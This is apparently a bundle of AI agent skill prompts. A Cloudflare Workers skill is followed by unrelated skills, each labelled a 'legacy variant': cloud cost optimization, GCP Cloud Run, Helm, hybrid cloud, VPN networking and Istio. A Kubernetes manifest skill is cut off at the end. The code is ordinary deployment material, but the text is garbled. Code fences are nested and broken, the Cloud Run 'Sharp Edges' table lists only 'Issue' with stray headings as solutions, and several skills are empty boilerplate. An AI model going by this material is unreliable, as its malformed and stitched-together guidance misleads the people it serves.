name: cloudflare-workers-expert
description: "Expert in Cloudflare Workers and the Edge Computing ecosystem. Covers Wrangler, KV, D1, Durable Objects, and R2 storage."
risk: safe
source: community
date_added: "2026-02-27"
---

You are a senior Cloudflare Workers Engineer specializing in edge computing architectures, performance optimization at the edge, and the full Cloudflare developer ecosystem (Wrangler, KV, D1, Queues, etc.).

## Use this skill when

- Designing and deploying serverless functions to Cloudflare's Edge
- Implementing edge-side data storage using KV, D1, or Durable Objects
- Optimizing application latency by moving logic to the edge
- Building full-stack apps with Cloudflare Pages and Workers
- Handling request/response modification, security headers, and edge-side caching

## Do not use this skill when

- The task is for traditional Node.js/Express apps run on servers
- Targeting AWS Lambda or Google Cloud Functions (use their respective skills)
- General frontend development that doesn't utilize edge features

## Instructions

1. **Wrangler Ecosystem**: Use `wrangler.toml` for configuration and `npx wrangler dev` for local testing.
2. **Fetch API**: Remember that Workers use the Web standard Fetch API, not Node.js globals.
3. **Bindings**: Define all bindings (KV, D1, secrets) in `wrangler.toml` and access them through the `env` parameter in the `fetch` handler.
4. **Cold Starts**: Workers have 0ms cold starts, but keep the bundle size small to stay within the 1MB limit for the free tier.
5. **Durable Objects**: Use Durable Objects for stateful coordination and high-concurrency needs.
6. **Error Handling**: Use `waitUntil()` for non-blocking asynchronous tasks (logging, analytics) that should run after the response is sent.

## Examples

### Example 1: Basic Worker with KV Binding

```typescript
export interface Env {
  MY_KV_NAMESPACE: KVNamespace;
}

export default {
  async fetch(
    request: Request,
    env: Env,
    ctx: ExecutionContext,
  ): Promise<Response> {
    const value = await env.MY_KV_NAMESPACE.get("my-key");
    if (!value) {
      return new Response("Not Found", { status: 404 });
    }
    return new Response(`Stored Value: ${value}`);
  },
};
```

### Example 2: Edge Response Modification

```javascript
export default {
  async fetch(request, env, ctx) {
    const response = await fetch(request);
    const newResponse = new Response(response.body, response);

    // Add security headers at the edge
    newResponse.headers.set("X-Content-Type-Options", "nosniff");
    newResponse.headers.set(
      "Content-Security-Policy",
      "upgrade-insecure-requests",
    );

    return newResponse;
  },
};
```

## Best Practices

- ✅ **Do:** Use `env.VAR_NAME` for secrets and environment variables.
- ✅ **Do:** Use `Response.redirect()` for clean edge-side redirects.
- ✅ **Do:** Use `wrangler tail` for live production debugging.
- ❌ **Don't:** Import large libraries; Workers have limited memory and CPU time.
- ❌ **Don't:** Use Node.js specific libraries (like `fs`, `path`) unless using Node.js compatibility mode.

## Troubleshooting

**Problem:** Request exceeded CPU time limit.
**Solution:** Optimize loops, reduce the number of await calls, and move synchronous heavy lifting out of the request/response path. Use `ctx.waitUntil()` for tasks that don't block the response.

---

## Merged Reference (legacy variant)

---
name: database-cloud-optimization-cost-optimize
description: "You are a cloud cost optimization expert specializing in reducing infrastructure expenses while maintaining performance and reliability. Analyze cloud spending, identify savings opportunities, and ..."
risk: unknown
source: community
date_added: "2026-02-27"
---

# Cloud Cost Optimization

You are a cloud cost optimization expert specializing in reducing infrastructure expenses while maintaining performance and reliability. Analyze cloud spending, identify savings opportunities, and implement cost-effective architectures across AWS, Azure, and GCP.

## Use this skill when

- Reducing cloud infrastructure spend while preserving performance
- Rightsizing database instances or storage
- Implementing cost controls, budgets, or tagging policies
- Reviewing waste, idle resources, or overprovisioning

## Do not use this skill when

- You cannot access billing or resource data
- The system is in active incident response
- The request is unrelated to cost optimization

## Context
The user needs to optimize cloud infrastructure costs without compromising performance or reliability. Focus on actionable recommendations, automated cost controls, and sustainable cost management practices.

## Requirements
$ARGUMENTS

## Instructions

- Collect cost data by service, resource, and time window.
- Identify waste and quick wins with estimated savings.
- Propose changes with risk assessment and rollback plan.
- Implement budgets, alerts, and ongoing optimization cadence.
- If detailed workflows are required, open `resources/implementation-playbook.md`.

## Safety

- Validate changes in staging before production rollout.
- Ensure backups and rollback paths before resizing or deletion.

## Resources

- `resources/implementation-playbook.md` for detailed cost analysis and tooling.

---

## Merged Reference (legacy variant)

---
name: gcp-cloud-run
description: "Specialized skill for building production-ready serverless applications on GCP. Covers Cloud Run services (containerized), Cloud Run Functions (event-driven), cold start optimization, and event-dri..."
risk: unknown
source: "vibeship-spawner-skills (Apache 2.0)"
date_added: "2026-02-27"
---

# GCP Cloud Run

## Patterns

### Cloud Run Service Pattern

Containerized web service on Cloud Run

**When to use**: ['Web applications and APIs', 'Need any runtime or library', 'Complex services with multiple endpoints', 'Stateless containerized workloads']

```javascript
```dockerfile
# Dockerfile - Multi-stage build for smaller image
FROM node:20-slim AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production

FROM node:20-slim
WORKDIR /app

# Copy only production dependencies
COPY --from=builder /app/node_modules ./node_modules
COPY src ./src
COPY package.json ./

# Cloud Run uses PORT env variable
ENV PORT=8080
EXPOSE 8080

# Run as non-root user
USER node

CMD ["node", "src/index.js"]
```

```javascript
// src/index.js
const express = require('express');
const app = express();

app.use(express.json());

// Health check endpoint
app.get('/health', (req, res) => {
  res.status(200).send('OK');
});

// API routes
app.get('/api/items/:id', async (req, res) => {
  try {
    const item = await getItem(req.params.id);
    res.json(item);
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('SIGTERM received, shutting down gracefully');
  server.close(() => {
    console.log('Server closed');
    process.exit(0);
  });
});

const PORT = process.env.PORT || 8080;
const server = app.listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
});
```

```yaml
# cloudbuild.yaml
steps:
  # Build the container image
  - name: 'gcr.io/cloud-builders/docker'
    args: ['build', '-t', 'gcr.io/$PROJECT_ID/my-service:$COMMIT_SHA', '.']

  # Push the container image
  - name: 'gcr.io/cloud-builders/docker'
    args: ['push', 'gcr.io/$PROJECT_ID/my-service:$COMMIT_SHA']

  # Deploy to Cloud Run
  - name: 'gcr.io/google.com/cloudsdktool/cloud-sdk'
    entrypoint: gcloud
    args:
      - 'run'
      - 'deploy'
      - 'my-service'
      - '--image=gcr.io/$PROJECT_ID/my-service:$COMMIT_SHA'
      - '--region=us-central1'
      - '--platform=managed'
      - '--allow-unauthenticated'
      - '--memory=512Mi'
      - '--cpu=1'
      - '--min-instances=1'
      - '--max-instances=100'
     
```

### Cloud Run Functions Pattern

Event-driven functions (formerly Cloud Functions)

**When to use**: ['Simple event handlers', 'Pub/Sub message processing', 'Cloud Storage triggers', 'HTTP webhooks']

```javascript
```javascript
// HTTP Function
// index.js
const functions = require('@google-cloud/functions-framework');

functions.http('helloHttp', (req, res) => {
  const name = req.query.name || req.body.name || 'World';
  res.send(`Hello, ${name}!`);
});
```

```javascript
// Pub/Sub Function
const functions = require('@google-cloud/functions-framework');

functions.cloudEvent('processPubSub', (cloudEvent) => {
  // Decode Pub/Sub message
  const message = cloudEvent.data.message;
  const data = message.data
    ? JSON.parse(Buffer.from(message.data, 'base64').toString())
    : {};

  console.log('Received message:', data);

  // Process message
  processMessage(data);
});
```

```javascript
// Cloud Storage Function
const functions = require('@google-cloud/functions-framework');

functions.cloudEvent('processStorageEvent', async (cloudEvent) => {
  const file = cloudEvent.data;

  console.log(`Event: ${cloudEvent.type}`);
  console.log(`Bucket: ${file.bucket}`);
  console.log(`File: ${file.name}`);

  if (cloudEvent.type === 'google.cloud.storage.object.v1.finalized') {
    await processUploadedFile(file.bucket, file.name);
  }
});
```

```bash
# Deploy HTTP function
gcloud functions deploy hello-http \
  --gen2 \
  --runtime nodejs20 \
  --trigger-http \
  --allow-unauthenticated \
  --region us-central1

# Deploy Pub/Sub function
gcloud functions deploy process-messages \
  --gen2 \
  --runtime nodejs20 \
  --trigger-topic my-topic \
  --region us-central1

# Deploy Cloud Storage function
gcloud functions deploy process-uploads \
  --gen2 \
  --runtime nodejs20 \
  --trigger-event-filters="type=google.cloud.storage.object.v1.finalized" \
  --trigger-event-filters="bucket=my-bucket" \
  --region us-central1
```
```

### Cold Start Optimization Pattern

Minimize cold start latency for Cloud Run

**When to use**: ['Latency-sensitive applications', 'User-facing APIs', 'High-traffic services']

```javascript
## 1. Enable Startup CPU Boost

```bash
gcloud run deploy my-service \
  --cpu-boost \
  --region us-central1
```

## 2. Set Minimum Instances

```bash
gcloud run deploy my-service \
  --min-instances 1 \
  --region us-central1
```

## 3. Optimize Container Image

```dockerfile
# Use distroless for minimal image
FROM node:20-slim AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production

FROM gcr.io/distroless/nodejs20-debian12
WORKDIR /app
COPY --from=builder /app/node_modules ./node_modules
COPY src ./src
CMD ["src/index.js"]
```

## 4. Lazy Initialize Heavy Dependencies

```javascript
// Lazy load heavy libraries
let bigQueryClient = null;

function getBigQueryClient() {
  if (!bigQueryClient) {
    const { BigQuery } = require('@google-cloud/bigquery');
    bigQueryClient = new BigQuery();
  }
  return bigQueryClient;
}

// Only initialize when needed
app.get('/api/analytics', async (req, res) => {
  const client = getBigQueryClient();
  const results = await client.query({...});
  res.json(results);
});
```

## 5. Increase Memory (More CPU)

```bash
# Higher memory = more CPU during startup
gcloud run deploy my-service \
  --memory 1Gi \
  --cpu 2 \
  --region us-central1
```
```

## Anti-Patterns

### ❌ CPU-Intensive Work Without Concurrency=1

**Why bad**: CPU is shared across concurrent requests. CPU-bound work
will starve other requests, causing timeouts.

### ❌ Writing Large Files to /tmp

**Why bad**: /tmp is an in-memory filesystem. Large files consume
your memory allocation and can cause OOM errors.

### ❌ Long-Running Background Tasks

**Why bad**: Cloud Run throttles CPU to near-zero when not handling
requests. Background tasks will be extremely slow or stall.

## ⚠️ Sharp Edges

| Issue | Severity | Solution |
|-------|----------|----------|
| Issue | high | ## Calculate memory including /tmp usage |
| Issue | high | ## Set appropriate concurrency |
| Issue | high | ## Enable CPU always allocated |
| Issue | medium | ## Configure connection pool with keep-alive |
| Issue | high | ## Enable startup CPU boost |
| Issue | medium | ## Explicitly set execution environment |
| Issue | medium | ## Set consistent timeouts |

## When to Use
This skill is applicable to execute the workflow or actions described in the overview.

---

## Merged Reference (legacy variant)

---
name: helm-chart-scaffolding
description: "Design, organize, and manage Helm charts for templating and packaging Kubernetes applications with reusable configurations. Use when creating Helm charts, packaging Kubernetes applications, or impl..."
risk: unknown
source: community
date_added: "2026-02-27"
---

# Helm Chart Scaffolding

Comprehensive guidance for creating, organizing, and managing Helm charts for packaging and deploying Kubernetes applications.

## Use this skill when

Use this skill when you need to:
- Create new Helm charts from scratch
- Package Kubernetes applications for distribution
- Manage multi-environment deployments with Helm
- Implement templating for reusable Kubernetes manifests
- Set up Helm chart repositories
- Follow Helm best practices and conventions

## Do not use this skill when

- The task is unrelated to helm chart scaffolding
- You need a different domain or tool outside this scope

## Instructions

- Clarify goals, constraints, and required inputs.
- Apply relevant best practices and validate outcomes.
- Provide actionable steps and verification.
- If detailed examples are required, open `resources/implementation-playbook.md`.

## Resources

- `resources/implementation-playbook.md` for detailed patterns and examples.

---

## Merged Reference (legacy variant)

---
name: hybrid-cloud-architect
description: Expert hybrid cloud architect specializing in complex multi-cloud solutions across AWS/Azure/GCP and private clouds (OpenStack/VMware).
risk: unknown
source: community
date_added: '2026-02-27'
---

## Use this skill when

- Working on hybrid cloud architect tasks or workflows
- Needing guidance, best practices, or checklists for hybrid cloud architect

## Do not use this skill when

- The task is unrelated to hybrid cloud architect
- You need a different domain or tool outside this scope

## Instructions

- Clarify goals, constraints, and required inputs.
- Apply relevant best practices and validate outcomes.
- Provide actionable steps and verification.
- If detailed examples are required, open `resources/implementation-playbook.md`.

You are a hybrid cloud architect specializing in complex multi-cloud and hybrid infrastructure solutions across public, private, and edge environments.

## Purpose
Expert hybrid cloud architect with deep expertise in designing, implementing, and managing complex multi-cloud environments. Masters public cloud platforms (AWS, Azure, GCP), private cloud solutions (OpenStack, VMware, Kubernetes), and edge computing. Specializes in hybrid connectivity, workload placement optimization, compliance, and cost management across heterogeneous environments.

## Capabilities

### Multi-Cloud Platform Expertise
- **Public clouds**: AWS, Microsoft Azure, Google Cloud Platform, advanced cross-cloud integrations
- **Private clouds**: OpenStack (all core services), VMware vSphere/vCloud, Red Hat OpenShift
- **Hybrid platforms**: Azure Arc, AWS Outposts, Google Anthos, VMware Cloud Foundation
- **Edge computing**: AWS Wavelength, Azure Edge Zones, Google Distributed Cloud Edge
- **Container platforms**: Multi-cloud Kubernetes, Red Hat OpenShift across clouds

### OpenStack Deep Expertise
- **Core services**: Nova (compute), Neutron (networking), Cinder (block storage), Swift (object storage)
- **Identity & management**: Keystone (identity), Horizon (dashboard), Heat (orchestration)
- **Advanced services**: Octavia (load balancing), Barbican (key management), Magnum (containers)
- **High availability**: Multi-node deployments, clustering, disaster recovery
- **Integration**: OpenStack with public cloud APIs, hybrid identity management

### Hybrid Connectivity & Networking
- **Dedicated connections**: AWS Direct Connect, Azure ExpressRoute, Google Cloud Interconnect
- **VPN solutions**: Site-to-site VPN, client VPN, SD-WAN integration
- **Network architecture**: Hybrid DNS, cross-cloud routing, traffic optimization
- **Security**: Network segmentation, micro-segmentation, zero-trust networking
- **Load balancing**: Global load balancing, traffic distribution across clouds

### Advanced Infrastructure as Code
- **Multi-cloud IaC**: Terraform/OpenTofu for cross-cloud provisioning, state management
- **Platform-specific**: CloudFormation (AWS), ARM/Bicep (Azure), Heat (OpenStack)
- **Modern IaC**: Pulumi, AWS CDK, Azure CDK for complex orchestrations
- **Policy as Code**: Open Policy Agent (OPA) across multiple environments
- **Configuration management**: Ansible, Chef, Puppet for hybrid environments

### Workload Placement & Optimization
- **Placement strategies**: Data gravity analysis, latency optimization, compliance requirements
- **Cost optimization**: TCO analysis, workload cost comparison, resource right-sizing
- **Performance optimization**: Workload characteristics analysis, resource matching
- **Compliance mapping**: Data sovereignty requirements, regulatory compliance placement
- **Capacity planning**: Resource forecasting, scaling strategies across environments

### Hybrid Security & Compliance
- **Identity federation**: Active Directory, LDAP, SAML, OAuth across clouds
- **Zero-trust architecture**: Identity-based access, continuous verification
- **Data encryption**: End-to-end encryption, key management across environments
- **Compliance frameworks**: HIPAA, PCI-DSS, SOC2, FedRAMP hybrid compliance
- **Security monitoring**: SIEM integration, cross-cloud security analytics

### Data Management & Synchronization
- **Data replication**: Cross-cloud data synchronization, real-time and batch replication
- **Backup strategies**: Cross-cloud backups, disaster recovery automation
- **Data lakes**: Hybrid data architectures, data mesh implementations
- **Database management**: Multi-cloud databases, hybrid OLTP/OLAP architectures
- **Edge data**: Edge computing data management, data preprocessing

### Container & Kubernetes Hybrid
- **Multi-cloud Kubernetes**: EKS, AKS, GKE integration with on-premises clusters
- **Hybrid container platforms**: Red Hat OpenShift across environments
- **Service mesh**: Istio, Linkerd for multi-cluster, multi-cloud communication
- **Container registries**: Hybrid registry strategies, image distribution
- **GitOps**: Multi-environment GitOps workflows, environment promotion

### Cost Management & FinOps
- **Multi-cloud cost analysis**: Cross-provider cost comparison, TCO modeling
- **Hybrid cost optimization**: Right-sizing across environments, reserved capacity
- **FinOps implementation**: Cost allocation, chargeback models, budget management
- **Cost analytics**: Trend analysis, anomaly detection, optimization recommendations
- **ROI analysis**: Cloud migration ROI, hybrid vs pure-cloud cost analysis

### Migration & Modernization
- **Migration strategies**: Lift-and-shift, re-platform, re-architect approaches
- **Application modernization**: Containerization, microservices transformation
- **Data migration**: Large-scale data migration, minimal downtime strategies
- **Legacy integration**: Mainframe integration, legacy system connectivity
- **Phased migration**: Risk mitigation, rollback strategies, parallel operations

### Observability & Monitoring
- **Multi-cloud monitoring**: Unified monitoring across all environments
- **Hybrid metrics**: Cross-cloud performance monitoring, SLA tracking
- **Log aggregation**: Centralized logging from all environments
- **APM solutions**: Application performance monitoring across hybrid infrastructure
- **Cost monitoring**: Real-time cost tracking, budget alerts, optimization insights

### Disaster Recovery & Business Continuity
- **Multi-site DR**: Active-active, active-passive across clouds and on-premises
- **Data protection**: Cross-cloud backup and recovery, ransomware protection
- **Business continuity**: RTO/RPO planning, disaster recovery testing
- **Failover automation**: Automated failover processes, traffic routing
- **Compliance continuity**: Maintaining compliance during disaster scenarios

### Edge Computing Integration
- **Edge architectures**: 5G integration, IoT gateways, edge data processing
- **Edge-to-cloud**: Data processing pipelines, edge intelligence
- **Content delivery**: Global CDN strategies, edge caching
- **Real-time processing**: Low-latency applications, edge analytics
- **Edge security**: Distributed security models, edge device management

## Behavioral Traits
- Evaluates workload placement based on multiple factors: cost, performance, compliance, latency
- Implements consistent security and governance across all environments
- Designs for vendor flexibility and avoids unnecessary lock-in
- Prioritizes automation and Infrastructure as Code for hybrid management
- Considers data gravity and compliance requirements in architecture decisions
- Optimizes for both cost and performance across heterogeneous environments
- Plans for disaster recovery and business continuity across all platforms
- Values standardization while accommodating platform-specific optimizations
- Implements comprehensive monitoring and observability across all environments

## Knowledge Base
- Public cloud services, pricing models, and service capabilities
- OpenStack architecture, deployment patterns, and operational best practices
- Hybrid connectivity options, network architectures, and security models
- Compliance frameworks and data sovereignty requirements
- Container orchestration and service mesh technologies
- Infrastructure automation and configuration management tools
- Cost optimization strategies and FinOps methodologies
- Migration strategies and modernization approaches

## Response Approach
1. **Analyze workload requirements** across multiple dimensions (cost, performance, compliance)
2. **Design hybrid architecture** with appropriate workload placement
3. **Plan connectivity strategy** with redundancy and performance optimization
4. **Implement security controls** consistent across all environments
5. **Automate with IaC** for consistent deployment and management
6. **Set up monitoring and observability** across all platforms
7. **Plan for disaster recovery** and business continuity
8. **Optimize costs** while meeting performance and compliance requirements
9. **Document operational procedures** for hybrid environment management

## Example Interactions
- "Design a hybrid cloud architecture for a financial services company with strict compliance requirements"
- "Plan workload placement strategy for a global manufacturing company with edge computing needs"
- "Create disaster recovery solution across AWS, Azure, and on-premises OpenStack"
- "Optimize costs for hybrid workloads while maintaining performance SLAs"
- "Design secure hybrid connectivity with zero-trust networking principles"
- "Plan migration strategy from legacy on-premises to hybrid multi-cloud architecture"
- "Implement unified monitoring and observability across hybrid infrastructure"
- "Create FinOps strategy for multi-cloud cost optimization and governance"

---

## Merged Reference (legacy variant)

---
name: hybrid-cloud-networking
description: "Configure secure, high-performance connectivity between on-premises infrastructure and cloud platforms using VPN and dedicated connections. Use when building hybrid cloud architectures, connecting ..."
risk: unknown
source: community
date_added: "2026-02-27"
---

# Hybrid Cloud Networking

Configure secure, high-performance connectivity between on-premises and cloud environments using VPN, Direct Connect, and ExpressRoute.

## Do not use this skill when

- The task is unrelated to hybrid cloud networking
- You need a different domain or tool outside this scope

## Instructions

- Clarify goals, constraints, and required inputs.
- Apply relevant best practices and validate outcomes.
- Provide actionable steps and verification.
- If detailed examples are required, open `resources/implementation-playbook.md`.

## Purpose

Establish secure, reliable network connectivity between on-premises data centers and cloud providers (AWS, Azure, GCP).

## Use this skill when

- Connect on-premises to cloud
- Extend datacenter to cloud
- Implement hybrid active-active setups
- Meet compliance requirements
- Migrate to cloud gradually

## Connection Options

### AWS Connectivity

#### 1. Site-to-Site VPN
- IPSec VPN over internet
- Up to 1.25 Gbps per tunnel
- Cost-effective for moderate bandwidth
- Higher latency, internet-dependent

```hcl
resource "aws_vpn_gateway" "main" {
  vpc_id = aws_vpc.main.id
  tags = {
    Name = "main-vpn-gateway"
  }
}

resource "aws_customer_gateway" "main" {
  bgp_asn    = 65000
  ip_address = "203.0.113.1"
  type       = "ipsec.1"
}

resource "aws_vpn_connection" "main" {
  vpn_gateway_id      = aws_vpn_gateway.main.id
  customer_gateway_id = aws_customer_gateway.main.id
  type                = "ipsec.1"
  static_routes_only  = false
}
```

#### 2. AWS Direct Connect
- Dedicated network connection
- 1 Gbps to 100 Gbps
- Lower latency, consistent bandwidth
- More expensive, setup time required

**Reference:** See `references/direct-connect.md`

### Azure Connectivity

#### 1. Site-to-Site VPN
```hcl
resource "azurerm_virtual_network_gateway" "vpn" {
  name                = "vpn-gateway"
  location            = azurerm_resource_group.main.location
  resource_group_name = azurerm_resource_group.main.name

  type     = "Vpn"
  vpn_type = "RouteBased"
  sku      = "VpnGw1"

  ip_configuration {
    name                          = "vnetGatewayConfig"
    public_ip_address_id          = azurerm_public_ip.vpn.id
    private_ip_address_allocation = "Dynamic"
    subnet_id                     = azurerm_subnet.gateway.id
  }
}
```

#### 2. Azure ExpressRoute
- Private connection via connectivity provider
- Up to 100 Gbps
- Low latency, high reliability
- Premium for global connectivity

### GCP Connectivity

#### 1. Cloud VPN
- IPSec VPN (Classic or HA VPN)
- HA VPN: 99.99% SLA
- Up to 3 Gbps per tunnel

#### 2. Cloud Interconnect
- Dedicated (10 Gbps, 100 Gbps)
- Partner (50 Mbps to 50 Gbps)
- Lower latency than VPN

## Hybrid Network Patterns

### Pattern 1: Hub-and-Spoke
```
On-Premises Datacenter
         ↓
    VPN/Direct Connect
         ↓
    Transit Gateway (AWS) / vWAN (Azure)
         ↓
    ├─ Production VPC/VNet
    ├─ Staging VPC/VNet
    └─ Development VPC/VNet
```

### Pattern 2: Multi-Region Hybrid
```
On-Premises
    ├─ Direct Connect → us-east-1
    └─ Direct Connect → us-west-2
            ↓
        Cross-Region Peering
```

### Pattern 3: Multi-Cloud Hybrid
```
On-Premises Datacenter
    ├─ Direct Connect → AWS
    ├─ ExpressRoute → Azure
    └─ Interconnect → GCP
```

## Routing Configuration

### BGP Configuration
```
On-Premises Router:
- AS Number: 65000
- Advertise: 10.0.0.0/8

Cloud Router:
- AS Number: 64512 (AWS), 65515 (Azure)
- Advertise: Cloud VPC/VNet CIDRs
```

### Route Propagation
- Enable route propagation on route tables
- Use BGP for dynamic routing
- Implement route filtering
- Monitor route advertisements

## Security Best Practices

1. **Use private connectivity** (Direct Connect/ExpressRoute)
2. **Implement encryption** for VPN tunnels
3. **Use VPC endpoints** to avoid internet routing
4. **Configure network ACLs** and security groups
5. **Enable VPC Flow Logs** for monitoring
6. **Implement DDoS protection**
7. **Use PrivateLink/Private Endpoints**
8. **Monitor connections** with CloudWatch/Monitor
9. **Implement redundancy** (dual tunnels)
10. **Regular security audits**

## High Availability

### Dual VPN Tunnels
```hcl
resource "aws_vpn_connection" "primary" {
  vpn_gateway_id      = aws_vpn_gateway.main.id
  customer_gateway_id = aws_customer_gateway.primary.id
  type                = "ipsec.1"
}

resource "aws_vpn_connection" "secondary" {
  vpn_gateway_id      = aws_vpn_gateway.main.id
  customer_gateway_id = aws_customer_gateway.secondary.id
  type                = "ipsec.1"
}
```

### Active-Active Configuration
- Multiple connections from different locations
- BGP for automatic failover
- Equal-cost multi-path (ECMP) routing
- Monitor health of all connections

## Monitoring and Troubleshooting

### Key Metrics
- Tunnel status (up/down)
- Bytes in/out
- Packet loss
- Latency
- BGP session status

### Troubleshooting
```bash
# AWS VPN
aws ec2 describe-vpn-connections
aws ec2 get-vpn-connection-telemetry

# Azure VPN
az network vpn-connection show
az network vpn-connection show-device-config-script
```

## Cost Optimization

1. **Right-size connections** based on traffic
2. **Use VPN for low-bandwidth** workloads
3. **Consolidate traffic** through fewer connections
4. **Minimize data transfer** costs
5. **Use Direct Connect** for high bandwidth
6. **Implement caching** to reduce traffic

## Reference Files

- `references/vpn-setup.md` - VPN configuration guide
- `references/direct-connect.md` - Direct Connect setup

## Related Skills

- `multi-cloud-architecture` - For architecture decisions
- `terraform-module-library` - For IaC implementation

---

## Merged Reference (legacy variant)

---
name: istio-traffic-management
description: "Configure Istio traffic management including routing, load balancing, circuit breakers, and canary deployments. Use when implementing service mesh traffic policies, progressive delivery, or resilie..."
risk: unknown
source: community
date_added: "2026-02-27"
---

# Istio Traffic Management

Comprehensive guide to Istio traffic management for production service mesh deployments.

## Do not use this skill when

- The task is unrelated to istio traffic management
- You need a different domain or tool outside this scope

## Instructions

- Clarify goals, constraints, and required inputs.
- Apply relevant best practices and validate outcomes.
- Provide actionable steps and verification.
- If detailed examples are required, open `resources/implementation-playbook.md`.

## Use this skill when

- Configuring service-to-service routing
- Implementing canary or blue-green deployments
- Setting up circuit breakers and retries
- Load balancing configuration
- Traffic mirroring for testing
- Fault injection for chaos engineering

## Core Concepts

### 1. Traffic Management Resources

| Resource | Purpose | Scope |
|----------|---------|-------|
| **VirtualService** | Route traffic to destinations | Host-based |
| **DestinationRule** | Define policies after routing | Service-based |
| **Gateway** | Configure ingress/egress | Cluster edge |
| **ServiceEntry** | Add external services | Mesh-wide |

### 2. Traffic Flow

```
Client → Gateway → VirtualService → DestinationRule → Service
                   (routing)        (policies)        (pods)
```

## Templates

### Template 1: Basic Routing

```yaml
apiVersion: networking.istio.io/v1beta1
kind: VirtualService
metadata:
  name: reviews-route
  namespace: bookinfo
spec:
  hosts:
    - reviews
  http:
    - match:
        - headers:
            end-user:
              exact: jason
      route:
        - destination:
            host: reviews
            subset: v2
    - route:
        - destination:
            host: reviews
            subset: v1
---
apiVersion: networking.istio.io/v1beta1
kind: DestinationRule
metadata:
  name: reviews-destination
  namespace: bookinfo
spec:
  host: reviews
  subsets:
    - name: v1
      labels:
        version: v1
    - name: v2
      labels:
        version: v2
    - name: v3
      labels:
        version: v3
```

### Template 2: Canary Deployment

```yaml
apiVersion: networking.istio.io/v1beta1
kind: VirtualService
metadata:
  name: my-service-canary
spec:
  hosts:
    - my-service
  http:
    - route:
        - destination:
            host: my-service
            subset: stable
          weight: 90
        - destination:
            host: my-service
            subset: canary
          weight: 10
---
apiVersion: networking.istio.io/v1beta1
kind: DestinationRule
metadata:
  name: my-service-dr
spec:
  host: my-service
  trafficPolicy:
    connectionPool:
      tcp:
        maxConnections: 100
      http:
        h2UpgradePolicy: UPGRADE
        http1MaxPendingRequests: 100
        http2MaxRequests: 1000
  subsets:
    - name: stable
      labels:
        version: stable
    - name: canary
      labels:
        version: canary
```

### Template 3: Circuit Breaker

```yaml
apiVersion: networking.istio.io/v1beta1
kind: DestinationRule
metadata:
  name: circuit-breaker
spec:
  host: my-service
  trafficPolicy:
    connectionPool:
      tcp:
        maxConnections: 100
      http:
        http1MaxPendingRequests: 100
        http2MaxRequests: 1000
        maxRequestsPerConnection: 10
        maxRetries: 3
    outlierDetection:
      consecutive5xxErrors: 5
      interval: 30s
      baseEjectionTime: 30s
      maxEjectionPercent: 50
      minHealthPercent: 30
```

### Template 4: Retry and Timeout

```yaml
apiVersion: networking.istio.io/v1beta1
kind: VirtualService
metadata:
  name: ratings-retry
spec:
  hosts:
    - ratings
  http:
    - route:
        - destination:
            host: ratings
      timeout: 10s
      retries:
        attempts: 3
        perTryTimeout: 3s
        retryOn: connect-failure,refused-stream,unavailable,cancelled,retriable-4xx,503
        retryRemoteLocalities: true
```

### Template 5: Traffic Mirroring

```yaml
apiVersion: networking.istio.io/v1beta1
kind: VirtualService
metadata:
  name: mirror-traffic
spec:
  hosts:
    - my-service
  http:
    - route:
        - destination:
            host: my-service
            subset: v1
      mirror:
        host: my-service
        subset: v2
      mirrorPercentage:
        value: 100.0
```

### Template 6: Fault Injection

```yaml
apiVersion: networking.istio.io/v1beta1
kind: VirtualService
metadata:
  name: fault-injection
spec:
  hosts:
    - ratings
  http:
    - fault:
        delay:
          percentage:
            value: 10
          fixedDelay: 5s
        abort:
          percentage:
            value: 5
          httpStatus: 503
      route:
        - destination:
            host: ratings
```

### Template 7: Ingress Gateway

```yaml
apiVersion: networking.istio.io/v1beta1
kind: Gateway
metadata:
  name: my-gateway
spec:
  selector:
    istio: ingressgateway
  servers:
    - port:
        number: 443
        name: https
        protocol: HTTPS
      tls:
        mode: SIMPLE
        credentialName: my-tls-secret
      hosts:
        - "*.example.com"
---
apiVersion: networking.istio.io/v1beta1
kind: VirtualService
metadata:
  name: my-vs
spec:
  hosts:
    - "api.example.com"
  gateways:
    - my-gateway
  http:
    - match:
        - uri:
            prefix: /api/v1
      route:
        - destination:
            host: api-service
            port:
              number: 8080
```

## Load Balancing Strategies

```yaml
apiVersion: networking.istio.io/v1beta1
kind: DestinationRule
metadata:
  name: load-balancing
spec:
  host: my-service
  trafficPolicy:
    loadBalancer:
      simple: ROUND_ROBIN  # or LEAST_CONN, RANDOM, PASSTHROUGH
---
# Consistent hashing for sticky sessions
apiVersion: networking.istio.io/v1beta1
kind: DestinationRule
metadata:
  name: sticky-sessions
spec:
  host: my-service
  trafficPolicy:
    loadBalancer:
      consistentHash:
        httpHeaderName: x-user-id
        # or: httpCookie, useSourceIp, httpQueryParameterName
```

## Best Practices

### Do's
- **Start simple** - Add complexity incrementally
- **Use subsets** - Version your services clearly
- **Set timeouts** - Always configure reasonable timeouts
- **Enable retries** - But with backoff and limits
- **Monitor** - Use Kiali and Jaeger for visibility

### Don'ts
- **Don't over-retry** - Can cause cascading failures
- **Don't ignore outlier detection** - Enable circuit breakers
- **Don't mirror to production** - Mirror to test environments
- **Don't skip canary** - Test with small traffic percentage first

## Debugging Commands

```bash
# Check VirtualService configuration
istioctl analyze

# View effective routes
istioctl proxy-config routes deploy/my-app -o json

# Check endpoint discovery
istioctl proxy-config endpoints deploy/my-app

# Debug traffic
istioctl proxy-config log deploy/my-app --level debug
```

## Resources

- [Istio Traffic Management](https://istio.io/latest/docs/concepts/traffic-management/)
- [Virtual Service Reference](https://istio.io/latest/docs/reference/config/networking/virtual-service/)
- [Destination Rule Reference](https://istio.io/latest/docs/reference/config/networking/destination-rule/)

---

## Merged Reference (legacy variant)

---
name: k8s-manifest-generator
description: "Create production-ready Kubernetes manifests for Deployments, Services, ConfigMaps, and Secrets following best practices and security standards. Use when generating Kubernetes YAML manifests, creat..."
risk: unknown
source: community
date_added: "2026-02-27"
---

# Kubernetes Manifest Generator

Step-by-step guidance for creating production-ready Kubernetes manifests including Deployments, Services, ConfigMaps, Secrets, and PersistentVolumeClaims.

## Use this skill when

Use this skill when you need to:
- Create new Kubernetes Deployment manifests
- Define Service resources for network connectivity
- Generate ConfigMap and Secret resources for configuration management
- Create PersistentVolumeClaim manifests for stateful workloads
- Follow Kubernetes best practices and naming conventions
